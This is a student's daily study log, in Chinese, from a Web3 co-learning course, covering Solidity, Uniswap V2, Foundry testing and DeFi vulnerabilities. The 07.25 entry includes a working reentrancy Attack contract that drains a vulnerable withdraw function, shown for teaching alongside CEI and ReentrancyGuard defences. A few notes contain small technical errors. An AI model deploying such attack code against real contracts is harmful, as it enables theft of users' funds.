# Web3 URL 残酷共学第 1 期残酷指引

> ⚠️ 正式开始前请确保你在身体上和精神上都处于合适的状态，请刻意练习，残酷面对 🆒。为方便检索 The First Web3 URL Intensive CoLearning 简写为 WICL1st，第 2 期即为WICL2nd，第 3 期即为 WICL3rd，以此类推。

> ⚠️ 报名需要按要求认真填写下面 [ XXX ] 部分，方可通过报名审核，通过审核即可开始自主学习。

---

# [ 你的名字 ]

1. **自我介绍：**

   Bugmaker [ from Cuit，web3 learner，focus on smart contract build and Solidity related project develop ,graduate in 2 years ]

2. **组队期待：**

   长期 [ 寻找区区块链开发的黑客松队友 ]

3. **你认为你会完成本次 Web3 URL 的残酷学习吗？**

   Yes [ Yes 100% or Maybe xx% ]

---

## 第 1 期共学时间计划

- **7 月 8 日 - 7 月 14 日**：

  - 自我介绍：大家按要求更新上方自我介绍，方面大家互相了解，及后续自由组队方向。

  -  [Web3 URL 残酷共学频道](https://t.me/LXDAO/8748)报道：大家可以自由在残酷共学群里交流分享，互动答疑，根据自身学习阶段情况随时开启自由组队。

  - 课前学习：了解残酷共学流程，GitHub 协作共学基础；Web3:// 协议课前学习。

- **7 月 15 日 - 7 月 21 日**：

  - **7 月 15 日 周一晚 8 点- 9 点（北京时间）：** 第 1 次公开课分享
  - **本周共学内容：** 涉及 Web3://  的背景和演进历史；支持 Web3://  协议的访问方式 (gateway 和 EVM browser)来浏览以太坊上面的数据；熟悉使用 Web3://  和 EthStorage 早期测试网来部署简单的去中心化网站。
  - **Homework1：** 见[课程 PPT](https://docs.google.com/presentation/d/1egJUKJrjC9wjkmOF9sLBkTSwHpd6hl8FXkWehPW7kFk/edit#slide=id.g1754f50a55c_0_11)。

- **7 月 22 日 - 7 月 28 日**
  - **7 月 22 日 周一晚 8 点- 9 点（北京时间）：** 第 2 次公开课分享

  - **本周共学内容：** 涉及 Web3://  高级开发工具，包括：在命令行通过 web3curl 来通过 Web3://  协议下载数据，通过 ethfs-uploader 批量上传网页数据，通过 manual 模式来搭建去中心化多人交互全链网站；及深入理解以太坊的存储模型和 gas 开销等。
  - **边学边用实战开发：** 根据组队情况自由安排。
  - **Homework2：** 见[课程 PPT](https://docs.google.com/presentation/d/1egJUKJrjC9wjkmOF9sLBkTSwHpd6hl8FXkWehPW7kFk/edit#slide=id.g1754f50a55c_0_11)。

- **7 月 29 日 - 8 月 4 日**
  - **7 月 29 日 周一晚 8 点- 9 点（北京时间）：** 第 3 次公开课分享
  - **本周共学内容：** 涉及实际应用案例分享及未来以太坊基础设施在 Web3://  的重要作用及开发方向等。
  - **边学边用实战开发：** 根据组队情况自由安排。
  - **结营分享：** 具体时间及详情另在「Web3 URL 残酷共学频道」通知。

---

## 笔记证明 Notes Proof
<!-- Content_START --> 
### 07.13
- 今日学习时间：7.13 9 a.m--12 a.m
- 学习内容小结：`solidity`语法回顾  
`require`语句的用法  
`msg.sender&&t.orign`的区别（`msg.sender`指的是函数的调用者，`tx.orign`指的是合约总的发起人，一般是钱包地址）  
`mapping`的用法，包括赋值、查询、删除语句  
`引用类型`：对于已分配好的引用类型，对原有值的改变*不会*影响现有值  
`字符串`：string.concat--字符串连接，bytes().length--获取字符串长度  
复习了常见的控制流语句
### 07.14
- 今日学习时间：7.14 2 p.m--5 p.m
- 学习内容小结：`Uniswap V2`概念学习  

*Flash Swap*   
>Uniswap v2增加了一个新特性，允许用户在支付费用前先收到并使用代币，只要他们在同一个交易中完成支付。swap方法会在转出代币和检查k值两个步骤之间，调用一个可选的用户指定的回调合约。一旦回调完成，Uniswap合约会检查当前代币余额，并且确认其满足k值条件（在扣除手续费后）。如果当前合约没有足够的余额，整个交易将被回滚。
利用的是以太坊交易的原子性，用户已经接受到代币，后续如果检查k值不符合规定，就会回滚交易，整个交易不会被确认，即用户不会收到闪电贷的代币。  

*WAP--时间加权*
>由于uniswap的价格定义规则，币价由上个区块最后记录的价格决定。在新一笔交易确认之前，修改上个区块的币价，则会导致币价波动。
假设交易池中有a 200、b 100，以a的来表示b的价格则为b=2a
若在下一笔交易产生之前，向交易池中发送100b，这是b的价格则为b=a，而不是b=2a
这样币价在短时间内偏离了市场价格，可能导致攻击者进行套利操作  
此时Uniswap就采用了TWAP进行控制币价短时间波动  

*手续费*  
>Uniswap 手续费为交易额的0.3%，手续费会根据权重分给LP，交易保证池子满足x*y=k，代币数量可能会发生改变，但是x与y的乘积不变。  
手续费会增加交易池的价值，币的总数可能也会改变。  

*流动性代币*
>流动性代币（Liquidity Tokens），有时称为流动性提供者代币（LP Tokens），是由去中心化交易所（如Uniswap）发行的代币，用来表示流动性提供者在特定流动性池中的份额。当流动性提供者向流动性池中注入代币时，他们会收到相应的流动性代币作为凭证。
>流动性代币的数量与交易池中的总价值成比例。例如，如果用户提供了流动性池10%的代币，他们将获得总流动性代币的10%。
*首次铸币攻击*
>首次铸币攻击是指攻击者在第一次添加流动性时存入最小单位（10的-18次方，即1 wei）的流动性，比如1 wei ABC和1 wei XYZ，此时将铸造1 wei 流动性代币（根号1，二者乘积的算数平方根）；同时，攻击者在同一个交易中继续向池子转入（非铸造）100万个ABC和100万个XYZ，接着调用 sync()方法更新缓存余额，此时1 wei的流动性代币价值100万+(10的-18次方)ABC和100万+(10的-18次方)XYZ。因为这是交易的最小单位，其他流动性参与者要想添加流动性，需要等价的大量代币，其价格可能高到大部分人无法参与。
### 07.15
- 今日学习时间：7.15  9 a.m.--2 p.m.
- 学习内容小结：Solidity 语法复习  
##### `try-catch` 语法  
##### `library`库函数用法
>库函数属性无论为`internal`还是`public`，都可以被合约所调用。调用`internal`属性的函数，等同于调用合约内部的`internal`属性的函数，无需额外的`gas`消耗；而调用`public`属性的函数则等同于合约`public`函数的调用，会产生额外的合约调用开销。  
使用`using for`，可将库函数作为成员变量赋值给类型，例如，`using Math for uint256` 表示之后，`uint256`类型的数据可以直接调用`Math`库中的函数，并将自身作为第一个参数。    

##### Override&&Virtual  
>只有被`Virtual`定义的函数，才能被重写。重写的函数必须保证参数列表和返回值类型一致。这包括参数的顺序、类型和名称。  
重写需要有`override`属性  
#### FAQ
>枚举能和整型进行类型转换吗？  
  枚举类型可以与整数进行显式转换，但不能进行隐式转换。  

```solidity
//修饰符的语法结构
modifier demo() {
 ...  // 函数执行前执行的代码
  _;   // 执行被修饰的函数
  ...  // 函数执行结束后执行的代码
}
```

>接口有哪些特性  
接口不能实现任何函数；  
接口无法继承其它合约，但可以继承其它接口；  
接口中的所有函数声明必须是`external`的；  
接口不能定义构造函数；  
接口不能定义状态变量；

### 07.16
- 今日学习时间：7.16  8 p.m.--10 p.m.
- 学习内容小结：Solidity 语法复习 +ether.js了解
#### receive  
用于合约接受ether，必须为`external`和`payable`属性。  
receive属于solidity默认的逻辑。  
receive不接受任何参数传入，且没有返回值。如果有参数传入，则会调用fallback函数。
*如果合约中既没有receive(),又没有fallback(),向合约中传入ether则会显示交易失败。*  
`receive() external payable{}`
#### fallback
fallback函数会在三种情况下被调用：
1. 调用者尝试调用一个合约中不存在的函数时
2. 用户给合约发Ether但是receive函数不存在
3. 用户发Ether，receive存在，但是同时用户还发了别的数据（msg.data不为空）  
`fallback（）external{}`
#### 数据编码
`abi.encode(data)`,将数据编码为字节码，以规范编程。data的数据类型可以为string，uint256等等  
`abi.decode(data,(uint256...))`，解码，data为要解码的数据，后面为要解码成的数据类型，可以解码为多种数据类型。  
`abi.encodePacked(data)`,这是一个与 abi.encode 类似但有所不同的全局函数。它也用于将参数编码为符合 ABI 标准的字节数组，但不会为每个参数添加其类型的长度信息，也不会在参数之间添加分隔符，结果是一个紧密打包的字节数组.
#### FAQ
>什么是ethers.js  
Ethers.js 是一个使用Typescript编写的库，用于构建去中心化应用程序（DApps）的前端，或者与以太坊网络进行交互。它抽象了许多复杂性，使开发人员能够简单直观地构建DApp。

### 07.17
- 今日学习时间：7.17  4 p.m.--6 p.m.
- 学习内容小结：完成 筹集合约 

### 07.18
- 今日学习时间：7.18  10 a.m.--12 a.m.
- 学习内容小结：Foundry test学习

### 什么是 Foundry
>Foundry 是一个 Solidity 框架，用于构建、测试、模糊、调试和部署Solidity 智能合约， Foundry 的优势是以 Solidity 作为第一公民，完全使用 Solidity 进行开发与测试，如果不太熟JavaScript，使用 Foundry 是一个非常好的选择，而且 Foundry 构建、测试的执行速度非常快。  
#### Foundry的主要工具:
* ***Forge*** 用来进行合约的测试
* ***Cast*** 很方便的与合约进行交互，发交易，查询链上数据
* ***Anvil*** 可以模拟一个私有节点
* ***Chisel*** 可以在命令行快速的有效的实时的写合约，测试合约

#### Foundry测试 forge test
1. 测试文件统一放在`test`包中，命名方式为`***.t.sol`
2. 测试方法的命名，是由`test_ `为前缀，后面遵循驼峰命名法。
3.  测试函数必须为`public`或`external`属性
4. 继承 `forge-std` 标准库下的 `Test.sol` 合约来编写测试用例。
	`import {Test, console} from "forge-std/Test.sol";`
	`import {Counter} from "../src/Counter.sol";`
4. 进入`test`文件，执行 `forge test` 对所有的`test`文件进行测试。
5. `forge test --match-path test/Counter.t.sol`,命令，使用`--match-path` 来指定某一路径下的文件来进行测试。
6. `forge test --match-contract CounterTest --match-test test_Increment`,命令，用 `--match-contract `来指定测试合约的名称，其中 `--match-test` 用来指定调用的测试方法。
7. `-vv`到`-vvvvv`显示由低到高等级的信息显示程度。

#### Foundry部署&验证 forge create
`forge create --rpc-url <your_rpc_url> --private-key <your_private_key> --verify src/MyContract.sol:MyContract --constructor-args <constructor_args>`
* `rpc-url`: 即区块链节点 RPC，例如：https://eth-sepolia.g.alchemy.com/v2/xxxxxxxxx
* `private-key`: 即钱包私钥，建议创建专门用来开发测试的新钱包。
* `etherscan-api-key`: 即区块链浏览器的 API KEY TOKEN，用于验证合约。
* `verify`: 验证合约，即在浏览器中开源合约的代码。
* `MyContract` : 实际部署的合约，由于一个 solidity 中允许存在多个合约，因此这里指定需要部署的合约名称。
* `constructor-args`: 合约的构造参数，如果没有，可以不设置该属性。
### 07.20
- 今日学习时间：7.20  10 a.m.--12 a.m.
- 学习内容小结：Foundry test cheatCode&cast 学习
#### Foundry cast命令
* `cast chain-id ` 使用 cast chain-id 命令可以快速获取当前链的 ID，这是识别和确认你正在正确的区块链上操作的一个关键步骤。例如，在部署合约或验证交易时，确保链 ID 的准确性至关重要。
* `cast client`  获取当前客户端的版本。
* `cast gas-price` cast gas-price 命令为开发者提供了一个快速获取当前 gas 价格的途径，这对于估算交易成本非常有用。了解当前的 gas 价格可以帮助开发者更精确地设定交易的 gas limit，避免过高的交易费用或因 gas 不足导致的交易失败。
* `cast block-number` 使用 cast block-number 命令可以查询最新的区块号。这是追踪区块链当前状态的基本操作，非常有用于确定网络的最新交易和智能合约的活动状态。
* `cast basefee` cast basefee 命令允许你获取指定区块的基础费用。London 升级后，基础费用成为交易费用的一个组成部分，理解这一点对于估算交易成本非常重要。
* `cast block` 通过 cast block 命令，我们可以获取到指定区块的详细信息，如区块高度、时间戳、交易数等。这个命令是深入理解区块链状态变化的强大工具。
* `cast age` cast age 命令用于获取指定区块的时间戳，即区块生成的具体时间。这可以帮助开发者跟踪事件的具体发生时间，并分析区块链数据的时间序列。
* `cast balance` cast balance 命令用于获取特定以太坊账户地址或 ENS 名称的当前余额，单位是 wei。这个命令是日常区块链操作中经常使用的，无论是在开发智能合约、执行交易前的检查，还是简单地监控账户状态。

#### Foundry CheatCode
* `vm.prank` 在进行权限相关的测试时，我们经常需要模拟不同用户的行为。通过`vm.prank`函数，我们可以暂时切换调用者身份。
  例如有`onlyOwner（）`修饰时，使用`vm.prank`即可通过称为合约非所有者进行调用尝试。
* `vm.expectRevert` 测试合约在特定条件下是否正确还原是合约安全性验证的重要部分。`vm.expectRevert`允许我们指定一个特定的错误类型或信息，然后执行可能触发该错误的操作。如果合约按预期还原，则测试通过。
* `vm.expectEmit` 智能合约中的事件提供了一种在区块链上记录信息的方式。在测试中验证特定事件是否被正确触发及其参数是否符合预期，对于确保合约行为的正确性至关重要。`vm.expectEmit`允许我们预先指定期望的事件特征，并验证合约操作中是否触发了相应的事件。
  `vm.expectEmit(true, true, false, true);`
  前三个参数分别对应事件的indexed部分，最后一个为data部分。若是一个事件不足三个indexed，则对应的参数位置为false。date部分若有两个及以上数量的参数，需要全部匹配才会返回true。
XXX
### 07.21
- 今日学习时间：7.21  8 p.m.--10 p.m.
- 学习内容小结：Foundry FussTest 学习
#### Fuzz Test
Fuzz Testing（模糊测试）是一种自动化的软件测试技术，通过自动生成大量随机输入数据来测试程序。在智能合约的开发中，Fuzz Testing 被用来发现合约中潜在的漏洞和异常行为。本课将介绍如何进行智能合约的 Fuzz Testing。
测试用例
用于取款和存款的合约
```sol
pragma solidity 0.8.10;

contract Safe {
    receive() external payable {}

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
##### 单元测试
单元测试关注于测试代码中特定的功能点。通过编写测试用例，可以验证给定条件下，代码的行为是否符合预期。
```sol
import "forge-std/Test.sol";

contract SafeTest is Test {
    Safe safe;

    function setUp() public {
        safe = new Safe();
    }

    function test_Withdraw() public {
        payable(address(safe)).transfer(1 ether);
        uint256 preBalance = address(this).balance;
        safe.withdraw();
        uint256 postBalance = address(this).balance;
        assertEq(preBalance + 1 ether, postBalance);
    }
}
```
##### 属性测试
与单元测试不同，属性测试不是测试特定的输入和输出，而是验证一般性的属性或行为是否为真。属性测试通过随机生成大量的输入数据来测试代码，以确保在各种情况下代码的行为都符合预期。  

修改测试函数，引入`FussTest`
```sol
function testFuzz_Withdraw(uint256 amount) public {
    payable(address(safe)).transfer(amount);
    uint256 preBalance = address(this).balance;
    safe.withdraw();
    uint256 postBalance = address(this).balance;
    assertEq(preBalance + amount, postBalance);
}
```
*排除特定情况* 使用`vm.assume`作弊码，可以排除某些不希望进行测试的特定情况。例如，如果不想测试低于0.1 `ETH` 的取款，可以如下编写：
```sol

function testFuzz_Withdraw(uint96 amount) public {
    vm.assume(amount > 0.1 ether);
    // 测试逻辑...
}
```
##### 结果分析
* runs：测试运行的次数，默认情况下，Fuzz 测试会生成256个场景。
* μ（mu）：所有 Fuzz 运行中使用的平均 gas 量。
* ~（tilde）：所有Fuzz运行中使用的中位数 gas 量。
### 07.22
- 今日学习时间：7.22  4 p.m.--5 p.m.
- 学习内容小结：Foundry 不变性测试
#### 不变性测试
不变性测试的确是用来检查智能合约中的某些参数或状态在特定操作前后是否保持不变。它们通常被定义为合约逻辑的核心属性，确保在各种操作下这些关键属性不会意外地改变。  
不变性一般指的是交易前后不改变的参数。
##### 常见的不变性
* 总供应量：对于代币合约，代币的总供应量应在各种操作后保持不变，除非有特定功能如铸造或销毁。
* 余额一致性：用户的余额总和应该在转账操作前后保持一致，即转账金额不会凭空产生或消失。
* 所有者：某些重要合约的所有者或管理员角色在未明确转让的情况下应保持不变。
* 合约状态：合约中的某些状态变量（如激活状态、锁定状态等）在特定条件下应保持不变。
##### 如何进行不变性测试
1. 定义不变性条件：明确要测试的状态变量和条件。
2. 执行交易和操作：对合约执行各种可能的交易和操作。
3. 设置断言检查：在每次操作后检查不变性条件。
4. 报告结果：输出测试结果，指出是否有任何不变性条件被违反。
简单来说，就是操作后设置断言，检查不变性是否发生改变。

### 07.23
- 今日学习时间：7.23  4 p.m.--7 p.m.
- 学习内容小结：Foundry 实现NFT
#### 通过Foundry实现NFT
引用solmate-ERC721、oppenzeppelin中Strings、Ownable实现

```sol
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import "solmate/tokens/ERC721.sol";
import "openzeppelin-contracts/contracts/utils/Strings.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

contract NFT is ERC721, Ownable {
    using Strings for uint256;

    uint256 public currentTokenId;
    uint256 public constant MAX_CAPACITY = 10_000;
    uint256 public constant MINT_PRICE = 0.05 ether;

    string public baseURI;

    error MintPriceNotPaid();
    error MaxSupply();
    error NonExistentTokenURI(); 

    constructor(string memory _name, string memory _symbol, string memory _baseURI) 
        ERC721(_name, _symbol)
        Ownable(msg.sender) 
    {
        baseURI = _baseURI;
    }

    function tokenURI(uint256 tokenId)
        public
        view
        virtual
        override
        returns (string memory)
    {
        if (ownerOf(tokenId) == address(0)) {
            revert NonExistentTokenURI();
        }
        if (bytes(baseURI).length > 0) {
            return string(abi.encodePacked(baseURI, tokenId.toString()));
        } else {
            return "";
        }
    }

    function mintTo(address recipient) 
        public
        payable
        returns (uint256)
    {
        uint256 newItemId = ++currentTokenId;
        if (msg.value != MINT_PRICE) {
            revert MintPriceNotPaid();
        }
        if (newItemId > MAX_CAPACITY) {
            revert MaxSupply();
        }
        _safeMint(recipient, newItemId);
        return newItemId;
    }

    function setBaseURI(string memory _baseURI) external onlyOwner {
        baseURI = _baseURI;
    }
}

```

测试代码
```sol
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/NFT.sol";

contract NFTTest is Test {
    NFT private nft;

    function setUp() public {
        nft = new NFT("NFT_tutorial", "TUT", "baseUri");
    }

    function test_RevertMintWithoutValue() public {
        vm.expectRevert(NFT.MintPriceNotPaid.selector);
        nft.mintTo{value: 0 ether}(address(1));
    }

    function test_MintPricePaid() public {
        nft.mintTo{value: 0.05 ether}(address(1));
    }

    function test_RevertMintToZeroAddress() public {
        vm.expectRevert("INVALID_RECIPIENT");
        nft.mintTo{value: 0.05 ether}(address(0));
    }
}
```
### 07.24
- 今日学习时间：7.24  4 p.m.--5 p.m.
- 学习内容小结：学习GPU代币合约漏洞
### 07.25
- 今日学习时间：7.25  4 p.m.--6 p.m.
- 学习内容小结：学习重入攻击原理
#### 重入攻击
原理为在函数内部的多次操作，状态改变为在最后一次操作之后，故可以在合约状态改变之前，多次进行操作，直到目的达成。
```sol
function withdraw() public {
     uint256 bal = balances[msg.sender];
    require(bal > 0);
    
    (bool sent,) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
    }
```
当向合约中存入1ether，满足bal >0，即可进行withdraw操作。
编写attack函数
```sol
contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // receive is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
>receive是在合约接受到ether时自动执行的。当attack函数执行时，首先向目标合约存入amount数量的ether，然后将存入的ether取出。当attack合约接受到取出的ether时，自动执行receive，尝试取目标合约中的ether。因为此时的合约状态没有改变，receive函数将每次提取amount数量的ether，直到目标合约中余额不足而触发fallback。
##### 防范措施
通过`Check-Effects-Interactions(CEI)`模式
```sol
function withdraw() public {
		// 1.check
    uint256 bal = balances[msg.sender];
    require(bal > 0);

		// 2.effects
    balances[msg.sender] = 0;

		// 3.interactions
    (bool sent,) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}
```
其他防御措施，`ReentrancyGuard` 使用openzeppelin库中Guards（重入锁）
```sol
contract ReentrancyGuard {
    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
}

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
contract EtherStore is ReentrancyGuard {
    
    function withdraw() public nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
    
    // ...
}
```
它的作用就是在函数执行前先加一把锁，函数结束后释放锁，在发生重入时由于重新进入了该函数，此时锁还未释放，因此重入失败。
（但是会有额外的gas费用产生，采用CEI模式是根本解决方案）
### 07.26
- 今日学习时间：7.26  5 p.m.--6 p.m.
- 学习内容小结：学习闪电贷和合约账户漏洞
### 07.27
- 今日学习时间：7.27  9 p.m.--12 p.m.
- 学习内容小结：学习闪电贷漏洞
### 07.28
- 今日学习时间：7.28  6 p.m.--8 p.m.
- 学习内容小结：学习常见的Defi漏洞
### 07.29
- 今日学习时间：7.29  9 p.m.--12 p.m.
- 学习内容小结：继续学习常见的Defi漏洞
### 07.30
- 今日学习时间：7.30  7 p.m.--12 p.m.
- 学习内容小结：完成常见的Defi漏洞的学习
### 07.31
- 今日学习时间：7.31  5 p.m.--10 p.m.
- 学习内容小结：学习Node.js
### 08.01
- 今日学习时间：8.1  4 p.m.--9 p.m.
- 学习内容小结：学习Node.js、npm
### 08.02
- 今日学习时间：8.2  4 p.m.--10 p.m.
- 学习内容小结：学习hardhat
### 08.03
- 今日学习时间：8.3  8 p.m.--10 p.m.
- 学习内容小结：继续学习hardhat
<!-- Content_END -->
